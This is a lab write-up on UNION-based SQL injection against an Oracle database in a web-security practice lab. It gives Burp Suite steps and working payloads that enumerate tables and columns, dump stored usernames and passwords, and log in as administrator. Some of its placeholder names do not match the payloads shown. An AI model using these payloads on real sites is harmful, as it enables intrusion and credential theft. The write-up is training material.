## Objective

Exploit a **UNION-based SQL injection** vulnerability to:

1. Determine the number of columns.
2. Identify which columns support text data.
3. Enumerate database tables.
4. Identify the user credentials table.
5. Discover the username and password column names.
6. Retrieve all usernames and passwords.
7. Log in as the administrator.

---

# Step 1: Intercept the Request

1. Open **Burp Suite**.
2. Turn **Intercept ON**.
3. Visit the vulnerable website.
4. Click on a product category (for example, **Tech gifts**).
5. Burp captures a request similar to:

```
GET /filter?category=Tech+gifts HTTP/2
Host: lab-id.web-security-academy.net
```

Send the request to **Repeater** (`Ctrl + R`).

---

# Step 2: Determine the Number of Columns

A `UNION SELECT` statement must return the **same number of columns** as the original query.

Since this lab uses **two columns**, verify this with:

```sql
'+UNION+SELECT+'abc','def'+FROM+dual--
```

### Explanation

```sql
UNION SELECT 'abc','def'
FROM dual
```

- `UNION` combines two queries.
- `'abc'` is returned in Column 1.
- `'def'` is returned in Column 2.
- `dual` is Oracle's built-in one-row table.
- `-` comments out the remainder of the original SQL query.

If **abc** and **def** appear on the page, then:

- The query returns **2 columns**.
- Both columns accept **text** values.

---
<img width="1278" height="735" alt="Screenshot 2026-08-04 at 3 32 52 PM" src="https://github.com/user-attachments/assets/07d249ac-acda-4b0c-a399-a55595faa35c" />


# Step 3: Retrieve All Table Names

Oracle stores metadata about tables in `all_tables`.

Use:

```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

### Explanation

```sql
UNION
SELECT
table_name,
NULL
FROM all_tables
```

Here:

- `table_name` returns every table name.
- `NULL` fills the second column because the original query returns two columns.
- `all_tables` contains every accessible table.

<img width="1276" height="739" alt="Screenshot 2026-08-04 at 3 34 33 PM" src="https://github.com/user-attachments/assets/15af7bd4-ebb3-4dde-acc1-0aa6c4e70be8" />

# Step 4: Find the Column Names

Oracle stores column metadata in `all_tab_columns`.

Use:

```sql
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_GSAUNT'--
```

Replace USERS_GSAUNT with the actual table name found in the previous step.

### Explanation

```sql
UNION
SELECT
column_name,
NULL
FROM all_tab_columns
WHERE table_name='USERS_GSAUNT'
```

This returns all columns belonging to the target table.

<img width="1277" height="738" alt="Screenshot 2026-08-04 at 3 36 10 PM" src="https://github.com/user-attachments/assets/4ba839a0-2f87-4da8-ae4f-2598207637cb" />


# Step 5: Retrieve User Credentials

After discovering the table and column names, retrieve the stored credentials.

Example payload:

```sql
'+UNION+SELECT+USERNAME_SJDKAD,+PASSWORD_YQTCBG+FROM+USERS_GSAUNT--
```

Replace:

- `USERNAME_XYZ` with the discovered username column.
- `PASSWORD_XYZ` with the discovered password column.
- `USERS_YCDRZQ` with the discovered table name.

### Explanation

```sql
UNION
SELECT
USERNAME_XYZ,
PASSWORD_XYZ
FROM USERS_YCDRZQ
```
---

<img width="1272" height="768" alt="Screenshot 2026-08-04 at 3 37 08 PM" src="https://github.com/user-attachments/assets/84657e54-0cad-449b-8b2f-1df725e63e83" />


# Step 6: Log In

Locate the administrator's credentials:

```
Username:
administrator

Password:
q7m9pkd8
```

Use these credentials on the application's login page.

If successful, the lab is solved.

---
<img width="1279" height="723" alt="Screenshot 2026-08-04 at 3 38 30 PM" src="https://github.com/user-attachments/assets/e6fa3ff0-e7a6-4407-89b3-07c05c20e0ca" />

